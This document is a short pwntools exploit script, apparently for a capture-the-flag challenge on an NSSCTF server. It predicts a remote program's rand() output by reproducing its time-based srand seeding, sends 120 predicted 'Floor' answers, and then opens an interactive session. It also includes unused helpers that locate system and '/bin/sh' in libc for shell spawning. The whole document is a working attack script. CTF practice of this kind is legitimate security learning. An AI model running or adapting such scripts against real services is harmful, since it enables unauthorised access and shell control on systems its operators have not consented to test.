```cpp
from pwn import *

from struct import pack

from ctypes import *

from LibcSearcher import *

import base64

  

def s(a):

    p.send(a)

def sa(a, b):

    p.sendafter(a, b)

def sl(a):

    p.sendline(a)

def sla(a, b):

    p.sendlineafter(a, b)

def r():

    p.recv()

def pr():

    print(p.recv())

def rl(a):

    return p.recvuntil(a)

def inter():

    p.interactive()

def debug():

    gdb.attach(p)

    pause()

def get_addr():

    return u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))

def get_sb():

    return libc_base + libc.sym['system'], libc_base + next(libc.search(b'/bin/sh\x00'))

  

context(os='linux', arch='amd64', log_level='debug')

#p = process('./pwn')

p = remote('node3.anna.nssctf.cn', 28316)

elf = ELF('./pwn')

#libc = ELF('./libc-2.27-x64.so')

libc = ELF('/home/w1nd/Desktop/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

  

libc = cdll.LoadLibrary('/lib/x86_64-linux-gnu/libc.so.6')

libc.srand(libc.time(0))

libc.srand(libc.rand()%3 - 1522127470)

  

for i in range(120):

    sla(b'Floor ', str(libc.rand()%4 + 1))

  

inter()
```